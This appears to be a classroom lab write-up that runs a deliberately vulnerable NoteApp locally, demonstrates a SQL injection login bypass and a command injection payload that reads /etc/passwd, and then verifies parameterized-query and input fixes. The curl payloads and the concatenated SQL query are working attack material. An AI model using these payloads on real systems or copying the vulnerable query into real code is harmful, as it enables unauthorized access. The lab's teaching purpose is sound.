# Literal class-9 run on commit 8d59164 (teacher's version)

## Setup

```
$ git -C NoteApp archive --format=zip -o docver-src.zip 8d59164
$ Expand-Archive docver-src.zip docver
$ docker compose -p class9-docver -f docver/docker-compose.yml up -d --build
 Container class9-docver-db-1  Healthy
 Container class9-docver-web-1  Started
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8085/login
200
```

Source at this commit:

```python
query = (
    "SELECT id, username, role FROM users "
    "WHERE username = '" + username + "' AND password = '" + password + "'"
)
...
if row:                      # row exists -> logged in
```

## Break (before fix)

```
$ curl -s -c admin.jar \
    --data-urlencode "username=admin' -- " \
    --data-urlencode "password=anything" \
    http://127.0.0.1:8085/login -o /dev/null -w "%{http_code}"
302
$ curl -s -b admin.jar -o admin-sqli-page.html -w "%{http_code}" http://127.0.0.1:8085/admin
200
$ grep -o "<h1>[^<]*</h1>" admin-sqli-page.html
<h1>Users</h1>
```

```
$ curl -s -c alice.jar \
    --data-urlencode "username=alice' -- " \
    --data-urlencode "password=" \
    http://127.0.0.1:8085/login -o /dev/null -w "%{http_code}"
302
$ curl -s -b alice.jar -o alice-sqli-empty-dashboard.html -w "%{http_code}" \
    http://127.0.0.1:8085/dashboard
200
$ grep -E "alice|<h1>" alice-sqli-empty-dashboard.html
alice
<h1>My grades</h1>
```

The same worked with password `wrongpass`: the password was never part of the filter.

## Fix (document's reference shape)

```diff
-        query = (
-            "SELECT id, username, role FROM users "
-            "WHERE username = '" + username + "' AND password = '" + password + "'"
-        )
+        query = (
+            "SELECT id, username, role FROM users "
+            "WHERE username = %s AND password = %s"
+        )
...
-            cur.execute(query)
+            cur.execute(query, (username, password))
```

Rebuild, replay:

```
admin' --  / anything   -> login 200, "Invalid credentials.", /admin 302
alice' --  / wrongpass  -> login 200, "Invalid credentials.", /dashboard 302
alice / alicepw         -> login 302, /dashboard 200
```

## Command injection (before fix)

```
$ curl -s -c admin2.jar -d "username=admin&password=admin123" \
    http://127.0.0.1:8085/login -o /dev/null -w "%{http_code}"
302
$ curl -s -b admin2.jar --data-urlencode "host=127.0.0.1; id; head -2 /etc/passwd" \
    http://127.0.0.1:8085/admin/ping -o docver-cmdi-break.html -w "%{http_code}"
200
$ grep -E "uid=|root:x:0|daemon:" docver-cmdi-break.html
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms
uid=0(root) gid=0(root) groups=0(root)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

## Command injection (after fix)

```
$ curl -s -b admin2.jar --data-urlencode "host=127.0.0.1; id; head -2 /etc/passwd" \
    http://127.0.0.1:8085/admin/ping -o docver-cmdi-fixed.html -w "%{http_code}"
200
uid/passwd lines: 0
$ grep "Name or service" docver-cmdi-fixed.html
<pre>ping: 127.0.0.1; id; head -2 /etc/passwd: Name or service not known

$ curl -s -b admin2.jar --data-urlencode "host=127.0.0.1" \
    http://127.0.0.1:8085/admin/ping -o docver-ping-normal.html -w "%{http_code}"
200
$ grep "bytes from" docver-ping-normal.html
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.025 ms
```
